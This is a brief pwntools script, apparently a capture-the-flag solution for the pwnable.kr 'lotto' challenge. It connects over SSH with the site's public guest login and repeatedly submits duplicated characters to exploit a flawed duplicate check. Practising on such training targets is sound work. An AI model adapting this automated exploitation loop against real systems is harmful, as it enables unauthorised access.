"""
Pretty nice challenge.
I though i can crash it with integer overflow or something else.
But here we have just a bad random.
It works very well. Maybe i needed a three iterations.
"""
from pwn import *


def exploit():
    s = ssh(user='lotto', host='pwnable.kr', password='guest', port=2222)
    p = s.process('./lotto')
    # Circle in which we try to input our duplicated symbols
    for i in range(100):
        print(i)
        p.recv()
        p.sendline('1')
        p.recv()
        p.sendline('******')
        # Take two lines and decline first
        _, response = p.recvlines(2)
        response = response.decode('utf-8')
        if 'bad' not in response:
            # If it matched then quit
            print(response)
            break


if __name__=='__main__':
    exploit()
